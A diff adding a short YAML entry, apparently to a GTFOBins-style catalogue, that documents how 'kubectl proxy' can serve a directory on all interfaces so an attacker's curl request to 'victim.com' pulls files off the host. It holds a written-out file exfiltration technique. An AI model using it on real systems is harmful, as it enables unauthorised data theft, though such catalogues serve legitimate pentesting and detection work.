@@ -1,0 +1,15 @@
+---
+functions:
+  upload:
+  - code: |-
+      kubectl proxy --address=0.0.0.0 --port=12345 --www=/path/to/dir/ --www-prefix=/x/
+    contexts:
+      sudo:
+      suid:
+      unprivileged:
+    receiver:
+      code: |-
+        curl victim.com:12345/x/path/to/input-file -o /path/to/output-file
+      comment: |-
+        An HTTP client can be used on the attacker box to receive the data.
+...
